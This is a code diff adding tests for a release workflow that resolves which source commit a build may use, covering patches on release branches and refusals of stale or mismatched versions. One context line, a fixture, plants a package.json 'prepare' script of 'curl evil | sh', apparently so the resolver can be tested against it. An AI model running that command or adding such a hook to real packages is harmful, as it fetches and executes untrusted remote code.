@@ -260,6 +260,19 @@ describe("the source commit the run builds", () => {
     branchWith("patch", "patches/x.patch", "diff\n");
     branchWith("badVersion", "package.json", rootManifest("1.0.0\n- forged line"));
     branchWith("rootScripts", "package.json", rootManifest("0.6.0", { prepare: "curl evil | sh" }));
+    // Release lines (docs/RELEASING.md): release/0.6 diverges from main in application
+    // source. A 0.6.x patch on it is checked against the line's head, not main's.
+    git(origin, "checkout", "-qb", "release/0.6", `${main}~1`);
+    commit(origin, "packages/app/src/fix.ts", "export const fix = 1;\n");
+    commits.linePatch = commit(origin, "package.json", rootManifest("0.6.1"));
+    commit(origin, "CHANGELOG.md", "0.6.1 notes\n");
+    commits.lineNotes = git(origin, "rev-parse", "HEAD");
+    git(origin, "checkout", "-qb", "line-moved", commits.linePatch);
+    git(origin, "checkout", "-q", "release/0.6");
+    commits.lineHead = commit(origin, "packages/app/src/later.ts", "export const later = 1;\n");
+    // A 0.7.x version on the 0.6 line: never compared with release/0.6.
+    git(origin, "checkout", "-qb", "wrongLine", commits.linePatch);
+    commits.wrongLine = commit(origin, "package.json", rootManifest("0.7.1"));
     git(origin, "checkout", "-q", "--detach", main);
     commits.unbranched = commit(origin, "dangling", "d\n");
     git(origin, "checkout", "-q", "--detach", main);
@@ -286,6 +299,25 @@ describe("the source commit the run builds", () => {
 
   it("accepts a branch that is not a descendant of main when its tree otherwise matches", () => {
     expect(resolveWith(commits.sideways, main)).toBe(`sha=${commits.sideways}\n`);
+  });
+
+  it("accepts a patch on its own release line, checked against the line's head", () => {
+    expect(resolveWith(commits.lineHead, main)).toBe(`sha=${commits.lineHead}\n`);
+  });
+
+  it.each([
+    ["a patch the line has since moved past in source", () => commits.linePatch],
+    ["the line's release notes commit once the line moved on", () => commits.lineNotes],
+    ["a version whose own line does not contain it", () => commits.wrongLine],
+  ])("refuses %s", (_, requested) => {
+    let failure;
+    try {
+      resolveWith(requested(), main);
+    } catch (error) {
+      failure = error;
+    }
+    expect(failure?.status).toBe(1);
+    expect(String(failure.stdout)).toMatch(/^::error::.* differs from /m);
   });
 
   it("accepts changes to docs, workflow files and test files", () => {
